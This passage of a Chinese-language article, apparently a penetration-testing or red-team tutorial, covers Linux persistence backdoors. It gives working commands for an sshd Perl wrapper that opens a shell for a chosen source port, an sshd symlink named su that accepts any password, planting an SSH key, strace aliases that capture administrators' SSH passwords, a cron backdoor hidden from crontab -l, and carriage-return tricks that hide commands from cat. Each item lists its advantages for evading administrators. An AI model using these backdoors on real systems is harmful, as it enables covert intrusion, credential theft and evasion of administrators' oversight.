class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">vim</span><span class="token plain"> sshd </span><span class="token comment" style="color:#999988;font-style:italic"># 编辑sshd内容为以下</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">#!/usr/bin/perl</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">exec</span><span class="token string" style="color:#e3116c">&quot;/bin/sh&quot;</span><span class="token plain">if</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">getpeername</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">STDIN</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">=~</span><span class="token plain">/^</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">LF/</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic"># \x00\x00LF是19526的大端形式</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exec</span><span class="token punctuation" style="color:#393A34">{</span><span class="token string" style="color:#e3116c">&quot;/usr/bin/sshd&quot;</span><span class="token punctuation" style="color:#393A34">}</span><span class="token string" style="color:#e3116c">&quot;/usr/sbin/sshd&quot;</span><span class="token plain">,@ARGV</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">service</span><span class="token plain"> sshd restart</span><br></span></code></pre></div></div>
<p>在本机执行</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">socat STDIO TCP4:127.0.0.1:22,sourceport</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">19265</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" src="/assets/images/158236574815858279468-de0cfcb47d97133cb893ba69cda26a1a.jpg" width="1080" height="124" class="img_ev3q"></p>
<p>可以看到我利用socat限制了本地端口19526访问server的22端口反回一个sh窗。</p>
<p>修改端口可以修改..LF</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">import</span><span class="token plain"> struct</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">buffer </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> struct.pack</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;&gt;I6&#x27;</span><span class="token plain">,19526</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">print repr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">buffer</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" src="data:image/jpeg;base64,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" width="805" height="643" class="img_ev3q"></p>
<p><strong>优点：</strong></p>
<p>1、在无连接后门的情况下，管理员是看不到端口和进程的，last也查不到登陆。</p>
<p>2、在针对边界设备出网，内网linux服务器未出网的情况下，留这个后门可以随时管理内网linux服务器，还不会留下文件和恶意网络连接记录。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="ssh-软连接后门">SSH 软连接后门<a href="#ssh-软连接后门" class="hash-link" aria-label="SSH 软连接后门的直接链接" title="SSH 软连接后门的直接链接">​</a></h3>
<p>软连接后门的原理是利用了PAM配置文件的作用，将sshd文件软连接名称设置为su，这样应用在启动过程中他会去PAM配置文件夹中寻找是否存在对应名称的配置信息（su），然而su在pam_rootok只检测uid 0即可认证成功，这样就导致了可以使用任意密码登录。</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">ln</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-sf</span><span class="token plain"> /usr/sbin/sshd /tmp/su</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/tmp/su </span><span class="token parameter variable" style="color:#36acaa">-oPort</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">888</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" src="/assets/images/158236574842856249462-1ecc1f545b583560a00db8c53e175e49.jpg" width="1080" height="215" class="img_ev3q"></p>
<p>**优点：**能够绕过一些网络设备的安全流量监测</p>
<p>**缺点：**本地在查看监听端口时会暴露端口，建议设置成8081，8080等端口。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="ssh-公钥免密登陆">SSH 公钥免密登陆<a href="#ssh-公钥免密登陆" class="hash-link" aria-label="SSH 公钥免密登陆的直接链接" title="SSH 公钥免密登陆的直接链接">​</a></h3>
<p><code>ssh-keygen -t rsa</code>生成公钥</p>
<p>将<code>id_rsa.pub</code>内容放到目标<code>.ssh/authorized_keys</code>里</p>
<p><img decoding="async" loading="lazy" src="/assets/images/158236574857862523006-fcafc7b48e5812ef75c3b5ac014b5061.jpg" width="1080" height="580" class="img_ev3q"></p>
<p>这个是老生常谈的公钥免登陆，这种用法不只是用在留后门，还可以在一些特殊情况下获取一个交互的shell，如struts写入公钥，oracle写入公钥连接等情景。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="ssh-keylogger">SSH Keylogger<a href="#ssh-keylogger" class="hash-link" aria-label="SSH Keylogger的直接链接" title="SSH Keylogger的直接链接">​</a></h3>
<p>利用strace系统调试工具获取ssh的读写连接的数据，以达到抓取管理员登陆其他机器的明文密码的作用。</p>
<p>在当前用户的.bashrc里新建一条alias、这样可以抓取他登陆其他机器的ssh密码。算是alias后门。后面会在讲一下alias后门。</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token builtin class-name">alias</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">ssh</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;strace -o /tmp/sshpwd-`date &#x27;</span><span class="token plain">+%d%h%m%s</span><span class="token string" style="color:#e3116c">&#x27;`.log -e read,write,connect -s2048 ssh&#x27;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" src="/assets/images/15823657489882315516-7fd4ac6c5d20f5ea767c391b35c45f1a.jpg" width="1080" height="370" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" src="/assets/images/158236574911857635848-65d08f99a1d0893bdb12ebf6e08c8692.jpg" width="924" height="268" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="strace监听ssh来源流量">strace监听ssh来源流量<a href="#strace监听ssh来源流量" class="hash-link" aria-label="strace监听ssh来源流量的直接链接" title="strace监听ssh来源流量的直接链接">​</a></h3>
<p>不只是可以监听连接他人，还可以用来抓到别人连入的密码。应用场景如：通过漏洞获取root权限，但是不知道明文密码在横向扩展中可以使用。</p>
<p>之前有用别名的方式来抓取登陆其他机器时的密码、同样也可以利用strace来监听登陆本地的sshd流量。</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">ps</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-ef</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">grep</span><span class="token plain"> sshd </span><span class="token comment" style="color:#999988;font-style:italic">#父进程PID</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" src="/assets/images/15823657493082746662-9e154f1b27cf4fcbe7d27c9eed615fae.jpg" width="1080" height="437" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" src="/assets/images/15823657495783067713-fb0e2010b3d8cbecc2ef0c15637727d9.jpg" width="1080" height="126" class="img_ev3q"></p>
<p>可以看到也能抓到写入密码。</p>
<p><strong>Info：</strong></p>
<blockquote>
<p><a href="https://www.jakoblell.com/blog/2014/05/07/hacking-contest-ssh-server-wrapper" target="_blank" rel="noopener noreferrer">https://www.jakoblell.com/blog/2014/05/07/hacking-contest-ssh-server-wrapper</a></p>
<p><a href="https://www.freebuf.com/articles/system/178150.html" target="_blank" rel="noopener noreferrer">https://www.freebuf.com/articles/system/178150.html</a></p>
</blockquote>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="cron后门">Cron后门<a href="#cron后门" class="hash-link" aria-label="Cron后门的直接链接" title="Cron后门的直接链接">​</a></h2>
<p><strong>Cron介绍</strong></p>
<p>在Linux系统中，计划任务一般是由cron承担，我们可以把cron设置为开机时自动启动。cron启动后，它会读取它的所有配置文件（全局性配置文件/etc/crontab，以及每个用户的计划任务配置文件），然后cron会根据命令和执行时间来按时来调用工作任务。</p>
<p><strong>Cron后门</strong></p>
<p><a href="http://qqe2.com/cron" target="_blank" rel="noopener noreferrer">http://qqe2.com/cron</a> cron表达式在线生成：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">(crontab -l;echo &#x27;*/1 * * * * /bin/bash /tmp/1.elf;/bin/bash --noprofile -i&#x27;)|crontab -</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" src="/assets/images/158234182035993317816-6f3c08caa3fca37229b6e151edde922c.jpg" width="899" height="238" class="img_ev3q"></p>
<p>这样执行会在crontab列表里出现，如果是如上执行的话，管理员执行crontab -l就能看到执行的命令内容不是特别隐蔽。</p>
<p>那么就有了一个相对的高级用法，下面命令执行后会显示”no crontab for root”。其实就达到了一个隐藏的效果，这时候管理员如果执行crontab -l就会看到显示”no crontab for root”。</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">(crontab -l;printf &quot;*/1 * * * * /bin/bash /tmp/1.elf;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n&quot;)|crontab -</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" src="/assets/images/158234182046862655180-05510e088df7fe299da1b8149fb921b7.jpg" width="900" height="202" class="img_ev3q"></p>
<p>实际上是他将cron文件写到文件中。/var/spool/cron/crontabs/root 。而crontab -l就是列出了该文件的内容。</p>
<p>通常cat是看不到这个的，只能利用less或者vim看到，<strong>这也是利用了cat的一个缺陷</strong>，后面会讲到。</p>
<p><img decoding="async" loading="lazy" src="/assets/images/158234182058225137627-bcae86d6d63abb69174d190517457051.jpg" width="1080" height="232" class="img_ev3q"></p>
<p><code>/etc/cron.d/ /etc/cron.daily/ /etc/cron.weekly/  /etc/cron.hourly/  /etc/cron.monthly/</code> 这几个路径都可以存放cron执行脚本,对应的时间不同。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="hiding-from-cats">hiding-from-cats<a href="#hiding-from-cats" class="hash-link" aria-label="hiding-from-cats的直接链接" title="hiding-from-cats的直接链接">​</a></h3>
<p><strong>cat隐藏说明</strong></p>
<p>刚刚在cron里面提到了cat的一个缺陷。可以利用这个缺陷隐藏恶意命令在一些脚本中。这里的示例我就用hiding-from-cats里的例子吧。之所以单列出来，个人认为在一些大型企业的运维工具脚本中可以插入恶意代码，利用cat的缺陷还可以使管理员无法发现脚本被做手脚。</p>
<p>cat其实默认使用是支持一些比如\r回车符 \n换行符 \f换页符、也就是这些符号导致的能够隐藏命令。</p>
<p>使用python生成带有换行符的内容sh：</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cmd_h </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;echo &#x27;You forgot to check `cat -A`!&#x27; &gt; oops&quot;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic"># hidden</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cmd_v </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;echo &#x27;Hello world!&#x27;&quot;</span><span class="token plain">                         </span><span class="token comment" style="color:#999988;font-style:italic"># visible</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">with</span><span class="token plain"> </span><span class="token builtin">open</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;test.sh&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;w&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> f</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">output </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;#!/bin/sh\n&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">output </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> cmd_h </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;;&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> cmd_v </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot; #\r&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> cmd_v </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot; &quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">cmd_h</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">3</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;\n&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">f</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">write</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">output</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" src="/assets/images/15823418207207113264-e60fb4abf7821d927a90f1bf0c45617b.jpg" width="1080" height="411" class="img_ev3q"></p>
<p>使用coderunner生成了一个test.sh脚本。cat看了下脚本的内容是echo一个hello world! 且同目录下只有他本文件。然后我们用sh test.sh执行后。</p>
<p><img decoding="async" loading="lazy" src="/assets/images/158234182087380654545-ea7ec56259ffd7202f34542ce71f55fa.jpg" width="1080" height="848" class="img_ev3q"></p>
<p>可以看到执行脚本后生成了一个oops文件，内容就是 You forgot to check cat -A! 其实可以看出来这样就做到了恶意命令隐藏的效果。其实之前Cron后门中的隐藏方法就是利用了这个。如果使用cat —A 查看root文件的话就可以看到计划任务的真正内容了。</p>
